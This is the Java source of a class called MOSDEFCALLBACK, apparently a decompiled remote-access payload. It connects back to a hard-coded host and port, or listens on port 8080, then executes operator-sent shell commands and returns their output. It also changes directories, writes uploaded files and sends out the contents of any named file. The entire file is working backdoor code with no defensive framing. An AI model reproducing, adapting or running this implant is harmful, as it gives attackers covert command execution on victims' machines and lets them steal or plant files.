import java.io.BufferedReader;
import java.io.ByteArrayInputStream;
import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.ServerSocket;
import java.net.Socket;

class MOSDEFCALLBACK
  implements Runnable
{
  public Socket mySocket = null;
  public DataInputStream input = null;
  public DataOutputStream output = null;
  public String host = "192.168.1.100";
  public int port = 5555;
  public int listenport = 8080;
  public int mosdef_type = 0;
  public int mosdef_id = 0;

  public MOSDEFCALLBACK(String phost, int pport, int pmosdef_type, int pmosdef_id)
  {
    this.host = phost;
    this.port = pport;
    this.mosdef_type = pmosdef_type;
    this.mosdef_id = pmosdef_id;
  }

  public void run()
  {
    String out = "";

    String outstring = null;
    byte[] outdata = (byte[])null;

    boolean ret = connect(this.host, this.port);
    if (!ret)
    {
      ret = listen(this.listenport);
    }
    if (ret)
    {
      try
      {
        this.output.writeInt(this.mosdef_type);
        this.output.writeInt(this.mosdef_id);
      }
      catch (IOException localIOException) {
      }
      mainloop();
    }
  }

  public void sendstring(String stringdata)
    throws IOException
  {
    byte[] data = stringdata.getBytes();

    mosdefsend(data);
  }

  public void mosdefsend(byte[] data) throws IOException
  {
    this.output.writeInt(data.length);
    this.output.write(data, 0, data.length);
  }

  public boolean listen(int port)
  {
    try
    {
      ServerSocket myServerSocket = new ServerSocket(port);
      this.mySocket = myServerSocket.accept();
      this.input = new DataInputStream(this.mySocket.getInputStream());
      this.output = new DataOutputStream(this.mySocket.getOutputStream());
      return true; } catch (IOException localIOException) {
    }
    return false;
  }

  public void mainloop()
  {
    byte[] data = (byte[])null;
    byte[] outdata = (byte[])null;
    int done = 0;
    try
    {
      while (done != 1)
      {
        int length = this.input.readInt();
        int comtype = this.input.readInt();
        data = new byte[length];

        data = new byte[length];
        this.input.readFully(data, 0, length);

        if (comtype == 1)
        {
          String outstring = getcwd();
          sendstring(outstring);
        }
        else if (comtype == 2)
        {
          cd(new String(data));
        }
        else if (comtype == 3)
        {
          String outstring = runcommand(new String(data));
          sendstring(outstring);
        }
        else if (comtype == 4)
        {
          DataInputStream body = new DataInputStream(new ByteArrayInputStream(data));
          int filenameLength = body.readInt();
          byte[] filenameBytes = new byte[filenameLength];
          body.readFully(filenameBytes);
          String filename = new String(filenameBytes);
          byte[] filedata = new byte[length - 4 - filenameBytes.length];
          body.readFully(filedata);
          savefile(filename, filedata);
        } else {
          if (comtype != 5) {
            continue;
          }
          String filename = new String(data);
          byte[] filedata = getfiledata(filename);
          mosdefsend(filedata);
        }
      }
    }
    catch (Exception localException)
    {
    }
  }

  public String getcwd()
  {
    return System.getProperty("user.dir");
  }

  public void cd(String newdir)
  {
    System.setProperty("user.dir", newdir);
  }

  public byte[] getfiledata(String filename)
    throws IOException
  {
    FileInputStream input = new FileInputStream(filename);
    byte[] barray = new byte[input.available()];
    input.read(barray);
    return barray;
  }

  public void savefile(String filename, byte[] filedata) throws IOException
  {
    File dest = new File(getcwd(), filename);
    FileOutputStream out = new FileOutputStream(dest);
    out.write(filedata);
    out.close();
  }

  public boolean connect(String host, int port)
  {
    try
    {
      this.mySocket = new Socket(host, port);
      this.input = new DataInputStream(this.mySocket.getInputStream());
      this.output = new DataOutputStream(this.mySocket.getOutputStream());
      return true;
    } catch (IOException localIOException) {
    }
    return false;
  }

  public String runcommand(String command)
  {
    String str = null;
    String out_str = "";
    String prepend = "";

    String osname = new String(System.getProperty("os.name"));
    if (osname.indexOf("Windows") != -1)
    {
      prepend = "cmd.exe /c";
    }
    try
    {
      Process p = Runtime.getRuntime().exec(prepend + command);
      BufferedReader buf = new BufferedReader(new InputStreamReader(p.getInputStream()));
      while ((str = buf.readLine()) != null)
      {
        out_str = out_str + str + "\n";
      }
    } catch (IOException localIOException) {
    }
    return out_str;
  }
}